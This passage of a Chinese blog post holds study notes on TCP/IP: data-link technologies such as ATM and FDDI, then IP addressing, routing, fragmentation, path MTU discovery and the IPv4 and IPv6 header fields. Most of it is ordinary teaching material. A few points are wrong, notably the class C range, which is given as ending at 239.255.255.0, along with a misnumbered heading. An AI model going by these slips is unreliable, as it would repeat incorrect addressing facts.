src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401133434714.png" alt="PPPoE"></p><h3 id="3-6-其他数据链路"><a href="#3-6-其他数据链路" class="headerlink" title="3.6 其他数据链路"></a>3.6 其他数据链路</h3><h4 id="3-6-1-ATM"><a href="#3-6-1-ATM" class="headerlink" title="3.6.1 ATM"></a>3.6.1 ATM</h4><p>ATM是以一个叫做信元（5字节首部加48字节数据）的单位进行传输的数据链路，由于其线路占用时间短和能够高效传输大容量数据等特点主要用于广域网络的连接。</p><p><strong>ATM的特点：</strong>ATM是面向连接的一种数据链路，因此在进行通信传输之前一定要设置通信线路。ATM中没有类似以太网和FDDI那种发送权限的限制，它允许在任何时候发送任何数据，因此，当大量计算机同时发送大量数据时容易引发网络拥堵甚至使网络进入收敛状态，为了防止这一现象的出现，ATM中增加了限制带宽的功能。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401133857974.png" alt="ATM"></p><p><strong>同步与异步：</strong>以多个通信设备通过一条电缆相连的情况为例。这样连接的设备叫做TDM（时分复用设备）。TDM通常在两端TDM设备之间同步的同时，按照特定的时间将每个帧分成若干个时隙，按照顺序发送给目标地址。但是可能会造成许多空闲的时隙，利用率比较低。</p><p>ATM扩展了TDM，能够有效地提高线路的利用率，ATM在TDM的时隙中放入数据时，并非按照线路的顺序而是按照数据到达的顺序放入。</p><p>但是数据包传输顺序并不是简单地按照数据包到达的顺序进行发送，而是要根据VCI/VPI的信息对ATM单元进行排队和调度，排队与调度的原则主要是根据不同的服务质量要求，进行优先级、带宽保障、拥塞控制等方面的设置，从而保证网络的性能和数据流的传输顺序。</p><p>但是这样的话接收端必须要能够辨认真正的内容，为此发送端需要附加一个5字节的包首部，包含VPI、VCI等识别码用来标识具体的通信类型。这种VPI与VCI的值只在直连通信的两个ATM交换机之间设置，在其他交换机之间意思则完全不同。</p><p>ATM中信元传输所占用的时隙不固定，一个帧所占用的时隙数也不固定，而且时隙之间并不要求连续，这些特点可以有效减少空闲时隙，从而提高线路的利用率，但是需要额外附加5个字节的首部，增加了网络的开销，一定程度上降低了通信速度。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401140455309.png" alt="同步与异步"></p><p><strong>ATM与上层协议</strong></p><p>在以太网中一个帧最大可传输1500字节，FDDI可以最大传输4352字节，而ATM的一个信元只能发送固定的48字节数据。这48字节的数据部分若包含IP首部和TCP首部，则基本无法存放上层的数据，为此一般不会单独使用ATM，而是使用上层的AAL（ATM Adapter Layer)。在上层为IP的情况下，则叫做AAL5。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401135759880.png" alt></p><p>信元丢失一个，则整个IP包就相当于被损坏。此时，AAL5的帧检查位报错，导致接收端不得不丢弃所有的信元。所以出现丢失就要全部重发，重发的概率很高。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401141501021.png" alt></p><h4 id="3-6-2-POS"><a href="#3-6-2-POS" class="headerlink" title="3.6.2 POS"></a>3.6.2 POS</h4><p>POS是一种在SDH上进行包通信的一种协议。SDH是在光纤上传输数字信号的物理层规范。</p><h4 id="3-6-3-FDDI"><a href="#3-6-3-FDDI" class="headerlink" title="3.6.3 FDDI"></a>3.6.3 FDDI</h4><p>FDDI叫做分布式光线数据接口，FDDI采用令牌环的访问方式，令牌环访问方式在网络拥堵的情况下极容易导致网络收敛。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401142517793.png" alt="FDDI"></p><h4 id="3-6-4-Token-Ring"><a href="#3-6-4-Token-Ring" class="headerlink" title="3.6.4 Token Ring"></a>3.6.4 Token Ring</h4><p>令牌环网源自IBM开发的令牌环LAN技术，但是由于价格一直居高不下以及所支持的提供商较少未能得到普及。</p><h4 id="3-6-5-100VG-AnyLAN"><a href="#3-6-5-100VG-AnyLAN" class="headerlink" title="3.6.5 100VG-AnyLAN"></a>3.6.5 100VG-AnyLAN</h4><p>它以语音级的3类UTP电缆实现100Mbps的传输速率，它的数据帧格式既能应对以太网又能应对令牌环网。在传输方式上，它采用扩展了令牌传递方式的需求优先访问方式。</p><h4 id="3-6-6-光纤通道"><a href="#3-6-6-光纤通道" class="headerlink" title="3.6.6 光纤通道"></a>3.6.6 光纤通道</h4><p>实现数据通信的一种数据链路</p><h4 id="3-6-7-HIPPI"><a href="#3-6-7-HIPPI" class="headerlink" title="3.6.7 HIPPI"></a>3.6.7 HIPPI</h4><p>HIPPI用于连接超大型计算机传输速率为800Mbps或1.6Gbps，铜缆的实际传输距离在25米以内，但是光纤作为传输介质时，，可以延长到数公里</p><h4 id="3-6-8-IEEE1394"><a href="#3-6-8-IEEE1394" class="headerlink" title="3.6.8 IEEE1394"></a>3.6.8 IEEE1394</h4><p>也叫FireWire或i.Link，是面向家庭的局域网，主要用于连接AV等计算机外围设备。</p><h4 id="3-6-9-HDMI"><a href="#3-6-9-HDMI" class="headerlink" title="3.6.9 HDMI"></a>3.6.9 HDMI</h4><p>高清晰度多媒体接口，他可以通过一根缆线实现图像和声音等数字信号的高品质传输，曾主要用于DVD/蓝光播放器……</p><h4 id="3-6-19-iSCSI"><a href="#3-6-19-iSCSI" class="headerlink" title="3.6.19 iSCSI"></a>3.6.19 iSCSI</h4><p>它是将个人电脑连接硬盘的SCSI标准应用于TCP/IP网络上的一种标准。它把SCSI的命令和数据包含进IP包内，进行数据传输。由此，人们就可以像使用个人电脑内嵌的SCSI硬盘一样使用网络上直连的大规模硬盘了。</p><h4 id="3-6-11-InfiniBand"><a href="#3-6-11-InfiniBand" class="headerlink" title="3.6.11 InfiniBand"></a>3.6.11 InfiniBand</h4><p>InfiniBand是针对高端服务器的一种超高速传输接口技术，它最大的特点是高速，高可靠性以及低延迟。它支持多并发连接，将多个线缆合并为一个线缆。</p><h4 id="3-6-12-DOCSIS"><a href="#3-6-12-DOCSIS" class="headerlink" title="3.6.12 DOCSIS"></a>3.6.12 DOCSIS</h4><p>DOCSIS是有线电视传输数据的行业标准，定义了有线电视的同轴电缆与Cable Modem的连接及其与以太网进行转换的具体规范。</p><h4 id="3-6-13-高速PLC"><a href="#3-6-13-高速PLC" class="headerlink" title="3.6.13 高速PLC"></a>3.6.13 高速PLC</h4><p>高速PLC是指在家里或办公室内利用电力线上数MHz~数十MHz频带范围，实现数十Mbps-200Mbps传输速率的一种通信方式。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230401143741597.png" alt></p><h2 id="第四章-IP协议"><a href="#第四章-IP协议" class="headerlink" title="第四章 IP协议"></a>第四章 IP协议</h2><p>IP相当于OSI参考模型中的第三层—网络层</p><p>网络层的主要作用是“实现终端结点之间的通信”，这种终端结点之间的通信也叫“点对点通信“。</p><p>数据链路层的主要作用是在互连同一种数据链路的结点之间进行包传递，而一旦跨越多种数据链路，就需要网络层。网络层可以跨越不同的数据链路，即使是在不同的数据链路上也能实现两端节点之间的数据传输。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402184808012.png" alt></p><h3 id="4-1-IP基础知识"><a href="#4-1-IP基础知识" class="headerlink" title="4.1 IP基础知识"></a>4.1 <strong>IP基础知识</strong></h3><p>IP大致分成三大作用模块：IP寻址，路由、IP分包与组包。</p><p>MAC地址是用来标识同一个链路中不同计算机的一种识别码。</p><p>IP地址用于在连接到网络中的所有主机中识别出进行通信的目标地址。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402185345083.png" alt></p><p><strong>路由控制</strong></p><p>路由控制是指将分组数据发送到最终目标地址的功能。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402185728181.png" alt="路由控制"></p><p><strong>发送目标数据至最终目标地址：</strong>Hop译为“跳”。它是指网络中的一个区间。IP包正是在网络中一个个跳间被转发。因此IP路由也叫做多跳路由。在每一个区间内决定着包在下一跳被转发的路径。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402185930440.png" alt></p><p>1跳就是利用数据链路层以下分层的功能传输数据帧的一个区间。</p><p>多跳路由是指路由器或主机在转发IP数据包时只指定下一个路由器或主机，而不是将到目标地址为止的所有通路全都指定出来。因为每一个区间在转发IP数据包的时候会分别指定下一跳的操作，直至包达到最终的目标地址。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402190334651.png" alt></p><p>当某个IP数据包到达路由器时，路由器首先查找其目标地址，从而再决定下一步应该将这个包发往哪个路由器，然后将包发送过去。当这个IP包到达那个路由器之后，会再次经历查找下一目标地址的过程，并由该路由器转发给下一个被找到的路由器，这个过程可能会反复多次，直到找到最终的目标地址将数据包发送给这个结点。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402190643361.png" alt></p><p><strong>路由控制表</strong></p><p>为了将数据包发给目标主机，所有主机都维护这一张路由控制表，该表记录IP数据在下一步应该发给哪一个路由器，IP包将根据这个路由表在各个数据链路上传输。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402190825932.png" alt="路由控制表"></p><p>IP是实现多个数据链路之间通信的协议，数据链路根据种类的不同各有特点，对这些不同数据链路的相异特性进行抽象化也是IP的重要作用之一。</p><p>不同数据链路最大的区别在于最大传输单元（MTU）不同</p><p>在以太网中MTU是1500字节，在FDDI中是4352字节，ATM则是9180字节。IP的上一层可能会要求传送比这些MTU更多字节的数据，因此必须在线路上传送比包长还要小的MTU。</p><p>为了解决这个问题，IP进行分片处理。所谓分片处理是指，将较大的IP包分成多个较小的IP包，分片的包到了对端目标地址以后会再被组合起来传给上一层，即从IP的上层来看，它完全可以忽略数据包在途中的各个数据链路上的MTU，而只需按照源地址发送的长度接收数据包。IP就是以这种方式抽象化了数据链路层，使得从上层更不容易看到底层网络构造的细节。</p><p><strong>IP属于面向无连接型</strong></p><p>为什么IP采用面向无连接呢？</p><p>主要原因有两点：一是为了简化，而是为了提速。面向连接比起面向无连接处理相对复杂。甚至管理每个连接本身就是一个相当繁琐的事情。此外，每次通信之前都要事先建立连接，又会降低处理速度。需要有连接时，可以委托上一层提供此服务，因此，IP为了实现简单化与高速化采用面向无连接的方式。</p><p>既然IP已经是提供无连接了，如果需要可靠传输，就需要上一层来做这个服务，所以TCP采用了面向有连接型服务，负责保证对端主机确实接收到数据。</p><p><strong>为什么不让IP具有可靠传输的功能，从而把这两种协议合并在一起呢？</strong></p><p>如果要一种协议规定所有的功能和作用，那么该协议的具体实施和编程就会变得非常复杂，无法轻易实现。相比之下，按照网络分层，明确定义每层协议的作用和责任以后，针对每层具体的协议进行编程会更加有利于该协议的实现。网络通信中如果能进行有效的分层，就可以明确TCP与IP各自协议的最终目的，也有利于后续对这些协议进行扩展和性能上的优化，分层也简化了每个协议的具体实现。</p><h3 id="4-2-IP地址的基础知识"><a href="#4-2-IP地址的基础知识" class="headerlink" title="4.2 IP地址的基础知识"></a>4.2 IP地址的基础知识</h3><p>IP地址（IPv4地址）由32位正整数来表示</p><p>IP地址由<strong>网络标识</strong>和<strong>主机标识</strong>两部分组成。</p><p>网络标识在数据链路的每个段配置不同的值，网络标识必须保证相互连接的每个段的地址不相重复。而相同段内相连的主机必须有相同的网络地址。IP地址的主机标识则不允许在同一网段内重复出现。</p><p>IP包被转发到途中某个路由器时，正是利用目标IP地址的网络标识进行路由。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230402194400904.png" alt></p><p>现在以子网掩码区分网络标识和主机标识。</p><p><strong>IP地址的分类</strong></p><p>IP地址地址分成四个级别，分别是A类、B类、C类、D类，根据IP地址中从第1位到第4位的比特列对其网络标识和主机标识进行区分。</p><p><strong>A类地址：</strong>是以首位为“0”开头的地址，从第1位到第8位是它的网络标识，用十进制表示的话，0.0.0.0~127.0.0.0是A类的网络地址，A类地址的后24位相当于主机标识。</p><p><strong>B类地址：</strong>是前两位以”10”开头的地址。从第1位到第16位是它的网络标识。128.0.0.0~191.255.0.0是B类的网络地址。B类地址的后16位相当于主机标识。</p><p><strong>C类地址：</strong>是前三位为“110”的地址，从第1位到第24位是它的网络标识，用十进制表示的话，<strong>192.0.0.0~239.255.255.0</strong>是C类的网络地址，C类地址的后8位相当于主机标识。</p><p><strong>D类地址：</strong>D类IP地址是前四位为“1110”的地址，从第1位到第32位是它的网络标识，224.0.0.0~239.255.255.255是D类的网络地址，D类地址没有主机标识，常被用于多播。</p><p>表示IP地址的时候，比特位表示主机地址时，不可以全部为0或全部为1，全部为0只有在表示对应的网络地址或IP地址不可获知的情况下才使用，而全部为1的主机地址通常作为广播地址，所以分配的时候，需要去掉这两个情况。</p><p><strong>广播地址：</strong>广播地址用于在同一个链路中互相连接的主机之间发送数据包。</p><p>广播分为本地广播和直接广播。</p><p>在本网络内的广播叫做本地广播，在不同的网络之间的广播叫做直接广播。例如网络地址为192.168.0.0/24的主机向192.168.1.255/24的目标地址发送IP包，收到这个包的路由器，将数据转发给192.168.1.0/24，从而使得所有192.168.1.1~192.168.1.254的主机都能收到这个包。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230403084856420.png" alt="本地广播和直接广播"></p><p><strong>IP多播：</strong></p><p>多播用于将包发送给特定组内的所有主机，这里需要考虑一个效率的问题。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230403085113704.png" alt="单播、广播、多播通信"></p><p><strong>IP多播与地址</strong></p><p>多播使用D类地址，首位开始4位是“1110”，剩下的28位可以成为多播的组编号。从224.0.0.0到239.255.255.255都是多播地址的可用范围，其中从224.0.0.0到224.0.0.255不需要路由控制，在同一个链路中也能实现多播，而在这个范围之外设置多播地址会给全网所有组内成员发送多播的包。</p><p><strong>子网掩码</strong></p><p>网络标识相同的计算机必须同属于同一个链路。</p><p>引入子网后，一个IP地址就有了两种识别码，一个是IP地址本身，另一个是表示网络部的子网掩码。它对应的IP地址网络标识部分的位全部为“1”，对应IP地址主机标识的部分则全部为“0”</p><p><strong>CIDR与VLSM</strong></p><p>由于向各种组织份分配IP地址都以A类，B类，C类等分类为单位进行，最终的结果就是无法满足需求。</p><p>所以采用了任意长度分割IP地址的网络标识和主机标识，这种方式叫做CIDR（无类型域间选路）</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418183136847.png" alt></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418183144828.png" alt></p><p>可以将多个C类地址合并为一个网络</p><p>但是当网络内部采用固定长度的子网掩码机制的时候，域内所有的子网掩码都得使用同样的长度，但是有些部分可能有500台主机，另一些部分可能只有50台主机，所以采用同样的标准，很难构建一个高效的网络结构，所以出现了<strong>VLSM</strong>(可变长子网掩码)，它可以通过域间路由协议转换为RIP2以及OSPF实现。</p><p><strong>全局地址与私有地址</strong></p><p>使用唯一地址的话，会有IP地址耗尽的危险，所以出现了一个新技术，不要求为每一台主机或路由器分配一个固定的IP地址，而是在必要的时候只为相应数量的设备分配唯一的IP地址。</p><p>对于那些没有连接互联网的独立网络中的主机，只要保证在这个网络内地址唯一，可以不考虑互联网即可配置相应的IP地址，即私有网络的IP地址，如下：</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418184024252.png" alt></p><p>包含在这个范围内的IP地址都属于私有IP，而在此之外的IP地址称为全局IP，私有IP最早没有计划连接互联网，而只用于互联网之外的独立网络。</p><p><strong>私有IP地址结合NAT技术已成为现在解决IP地址分配问题的主流方案</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418184256891.png" alt></p><p><strong>全局地址由谁决定</strong></p><p>在世界范围内，全局IP由ICANN进行管理，互联网被广泛商用之后，人们向ISP申请接入互联网的同时也会申请全局IP地址</p><h3 id="4-3-路由控制"><a href="#4-3-路由控制" class="headerlink" title="4.3 路由控制"></a>4.3 路由控制</h3><p>发送数据包时所使用的地址是网络层的地址，即IP地址，但是仅仅有IP地址还不足以实现将数据包发送到对端目标地址，在数据发送过程中还需要类似于”指明路由器或主机”的信息，以便真正发往目标地址。保存这种信息的就是路由控制表。</p><p>该路由控制表的形成方式：<strong>手动设置</strong>和<strong>路由器与其他路由器相互交换信息时自动刷新</strong>，前者也叫静态路由控制，后者叫做动态路由控制</p><p><strong>1. IP地址与路由控制</strong></p><p>IP地址的网络地址部分用于进行路由控制，路由控制表中记录着网络地址与下一步应该发送至路由器的地址。在发送IP包时，首先需要确定IP包首部中的目标地址，再从路由控制表中找到与该地址具有相同网络地址的记录，根据该记录将IP包转发给相应的下一个路由器。如果路由器控制表中存在多条相同网络地址的记录，就选择一个最为吻合的网络地址。</p><p><strong>默认路由</strong>：指路由表中任何一个地址都能与之匹配的记录，一般被标记为0.0.0.0/0或default</p><p><strong>主机路由</strong>：IP地址/32也被称为主机路由。例如，192.168.153.15/32就是一种主机路由</p><p><strong>环回地址</strong>：环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。计算机使用一个特殊的IP地址127.0.0.1作为环回地址，与该地址具有相同意义的是一个叫做localhost的主机名</p><p><strong>2. 路由控制表的聚合</strong></p><p>能够缩小路由表的大小是它最大的优势，路由表越大，管理它所需要的内存和CPU也就越多，并且查找路由表的时间也会越长，导致转发IP数据包的性能下降，所以路由表的大小很关键。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418190153753.png" alt="路由聚合"></p><h3 id="4-4-IP分割处理与再构成处理"><a href="#4-4-IP分割处理与再构成处理" class="headerlink" title="4.4 IP分割处理与再构成处理"></a>4.4 IP分割处理与再构成处理</h3><p><strong>1. 数据链路不同，MTU则相异</strong></p><p>数据链路的类型不同，使用目的不同，可承载的MTU也就不同，鉴于IP属于数据链路上一层，它必须不受限于不同数据链路的MTU大小，但是IP抽象化了底层的数据链路。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418190300106.png" alt><strong>2. IP报文的分片与重组</strong></p><p>任何一台主机都有必要对IP分片进行相应的处理，分片往往在网络上遇到比较大的报文无法一下子发送出去才进行处理。</p><p>路由器来做分片，目标主机来做重组</p><p><strong>为什么？</strong></p><p>无法保证IP数据报是否经由同一个路径传送。因此，途中即使等待片刻，数据报也有可能无法到达目的地，因此在途中某一处被重新组装，但如果下一站再经过其他路由时还会面临被分片的可能，这会给路由器带来多余的负担，也会降低网络传送效率，出于这些原因，在终结点端重组分片了的IP数据报成为现行的规范。</p><p><strong>3. 路径MTU发现</strong></p><p>分片机制也有它的不足。首先，路由器的处理负荷加重，另一方面，随着人们对网络安全的要求提高，路由器需要做的其他处理越来越多，如网络过滤等。其次，在分片处理中，一旦某个分片丢失，则会造成整个IP数据报作废。</p><p>所以<strong>路径MTU发现</strong>应运而生</p><p>路径MTU是指从发送端主机到接收端主机之间不需要分片时最大MTU的大小，即路径中存在的所有数据链路中最小的MTU，而路径MTU发送从发送主机按照路径MTU的大小将数据报分片后进行发送，进行路径MTU发现，就可以避免在中途的路由器上进行分片处理，也可以在TCP中发送更大的包。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418194932522.png" alt="UDP路径MTU发现"></p><p><strong>路径MTU发现的工作原理</strong></p><p>首先在发送端主机发送IP数据报时将其首部的分片禁止标志位设置为1，根据这个标志位，途中的路由器即使遇到需要分片才能分片处理的大包，也不会分片，而是将包丢弃，随后通过一个ICMP的不可达消息将数据链路上MTU的值发送给主机。</p><p>下一次，从发送给同一个目标主机的IP数据报获得ICMP所通知的MTU值以后，将它设置为当前MTU，发送主机根据这个MTU对数据报进行分片处理。如此反复，直到数据报被发送到目标主机为止没有再收到任何ICMP，就认为最后一次ICMP所通知的MTU是一个合适的MTU值。</p><p>上面是UDP的例子，在TCP的情况下，根据路径MTU的大小计算出最大段长度，然后再根据这些信息进行数据报的发送。因此在TCP中如果采用MTU发现，IP层则不会再进行分片处理。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418200446401.png" alt="TCP路径MTU发现"></p><h3 id="4-5-IPv6"><a href="#4-5-IPv6" class="headerlink" title="4.5 IPv6"></a>4.5 IPv6</h3><p>IPv6是为了根本解决IPv4地址耗尽的问题而被标准化的网际协议</p><p>IPv4的地址长度为4个8位字节，即32比特</p><p>IPv6的地址长度为128位，8个16位字节</p><p><strong>IPv6的特点</strong></p><p>（1）IP地址的扩大与路由控制表的聚合</p><p>（2）性能提升</p><p>（3）支持即插即用功能</p><p>（4）采用认证与加密功能</p><p>（5）多播、Mobile IP成为扩展功能</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418202416790.png" alt></p><p><strong>全局单播地址</strong></p><p>n=48，m=16（下图貌似有误）</p><p>前64位为网络标识，后64位为主机标识</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418202601706.png" alt="全局单播地址"></p><p><strong>链路本地单播地址</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418202825142.png" alt="链路本地单播地址"></p><p>在同一个链路中的通信，通常接口ID保存64比特版的MAC地址</p><p><strong>唯一本地地址</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418203844341.png" alt="唯一本地地址"></p><p>唯一本地地址是不进行互联网通信时所使用的地址。设备控制的限制型网络以及金融机关的核心网等会与互联网隔离。为了提高安全性，企业内部的网络与互联网通信时通常会通过NAT或网关进行。</p><p><strong>IPv6分段处理</strong></p><p>IPv6的分片处理只在作为起点的发送端主机上进行，路由器不参与分片，这也是为了减少路由器的负荷，提高网速。</p><h3 id="4-6-IPv4首部"><a href="#4-6-IPv4首部" class="headerlink" title="4.6 IPv4首部"></a>4.6 IPv4首部</h3><p>通过IP进行通信的时候，需要在数据的前面加入IP首部信息。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418204307327.png" alt="IPv4首部"></p><p><strong>版本</strong>：4比特，表示表示IP首部的版本号，IPv4的版本号即为4</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418204415166.png" alt="版本"></p><p><strong>首部长度：</strong>4比特构成，表明IP首部的大小，单位为4字节。对于没有可选项的IP包，首部长度则设置为“5”，也就是说，当没选项时，IP首部的长度为20字节</p><p><strong>区分服务</strong>：8比特构成（TOS：Type of service），用来表明服务质量</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418204750215.png" alt="区分服务"></p><p>这个值通常由应用指定，但是现在也鼓励这种结合应用的特性设定TOS的方法，然而在目前，几乎所有的网络都无视这些字段。这不仅仅是因为在符合质量的情况下按其要求发送本身的功能实现起来十分困难，还因为若不符合质量要求就可能会产生不公平的现象，所以基本不咋用，有人提出将这个字段本身再划分为DSCP何ECN两个字段</p><p><strong>DSCP段和ECN段</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418205152904.png" alt="DSCP段和ECN段"></p><p>DSCP，用来进行质量控制；</p><p>如果3-5位的值为0,0-2位则被称为类别选择代码点。这样就可以像TOS的优先度那样提供8种类型的质量控级别，对于每一种级别所采取的措施则由提供DiffServ的运营管理者制定。为了与TOS保持一致，值越大优先度也越高，如果第5位为1，表示实验或本地使用的意思。</p><p>ECN（显式拥塞通告）用来报告网络拥堵情况，由两个比特构成</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418205813198.png" alt="ECN"></p><p>第6位的ECT用以通告上层TCP层协议是否处理ECN，当路由器在转发ECN为1的包的过程中，如果出现网络拥堵的情况，就将CE位设置为1</p><p><strong>总长度</strong></p><p>表示IP首部与数据部分合起来的总字节数，该字段长16比特，因此IP包的最大长度为65535字节</p><p><strong>标识</strong></p><p>16比特构成，用于分片重组</p><p><strong>标志</strong></p><p>3比特构成，表示包被分片的相关信息</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418210041270.png" alt="标志"></p><p><strong>片偏移（FO：Fragment Offset）</strong>：</p><p>由13比特构成，用来标识被分片的每一个分段相对于原始数据的位置。第一个分片对应的位置的值为0，由于FO域占13位，因此最多可以表示8192个相对位置，单位为8字节，因此最多可以表示8*8192=65536字节的位置</p><p><strong>生存时间（TTL：Time To Live）：</strong></p><p>8比特构成，以秒为单位记录当前包在网络上应该生存的期限，然而在实际中它是指可以中转多少个路由器的意思。每经过一个路由器，TTL会减少1，直到变成0则丢弃该包</p><p><strong>协议</strong>：8比特构成，表示IP首部的下一个首部隶属于哪一个协议</p><p>如4代表IP，6代表TCP，17代表UDP</p><p><strong>首部校验和（Header Checksum)：</strong></p><p>由16比特构成，也叫IP首部校验和。该字段只校验数据报的首部，不校验数据部分，用来确认IP数据报不被破坏。</p><p><strong>源地址</strong>：32比特，表示发送端IP地址</p><p><strong>目标地址</strong>：32比特，表示接收端IP地址</p><p><strong>可选项</strong>：长度可变，通常在进行实验或诊断时使用。包含如下几点信息：</p><p>（1）安全级别</p><p>（2）源路径</p><p>（3）路径记录</p><p>（4）时间戳</p><p><strong>填充</strong>：也称作填充物。在有可选项的情况下，首部长度可能不是32比特的整数倍，通过向字段填充0，调整为32比特的整数倍</p><p><strong>数据：</strong>存入数据，将IP上层协议的首部也作为数据进行处理</p><h3 id="4-7-IPv6首部"><a href="#4-7-IPv6首部" class="headerlink" title="4.7 IPv6首部"></a>4.7 IPv6首部</h3><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418211122022.png" alt="IPv6首部"></p><p>省略了首部校验和字段，因此路由器不再计算校验和，提高了包的转发效率。</p><p><strong>版本</strong>：与IPv4一样，4比特</p><p><strong>通信量类：</strong>相当于IPv4中的TOS字段，8比特</p><p><strong>流标号：</strong>20比特，准备用于服务质量控制。不使用Qos时每一位全部设置为0。</p><p>在进行服务质量控制时，将流标号设置为一个随机数，然后利用一种可以设置流的协议RSVP在路由器上进行Qos设置。当某个包在发送途中需要Qos时，需要附上RSVP预想的流标号。路由器接收到这样的IP包先后将流标号作为查找关键字，迅速从服务质量控制信息中查找并做相应处理。</p><p><strong>有效载荷长度：</strong>有效载荷是指包的数据部分。IPv4的TL是指包括首部在内的所有长度，然而IPv6中的这个Playload Length不包括首部，只表示数据部分的长度。</p><p><strong>下一个首部：</strong>相当于IPv4的协议字段，由8比特构成</p><p><strong>跳数限制：</strong>8比特构成，与IPv4中的TTL意思相同</p><p><strong>源地址：</strong>由128比特构成，表示发送端IP地址</p><p><strong>目标地址：</strong>128比特构成，表示接收端IP地址</p><p><strong>IPv6扩展首部</strong>：扩展首部通常介于IPv6首部与TCP/UDP首部中间。在IPv4中可选项长度固定为40字节，但是在IPv6中没有这样的限制，也就是说，IPv6的扩展首部可以是任意长度。扩展首部当中还可以包含扩展首部协议以及下一个扩展首部字段。</p><p>IPv6首部中没有标识以及标志字段，在需要对IP数据报进行分片时，可以使用扩展首部。</p><p><img 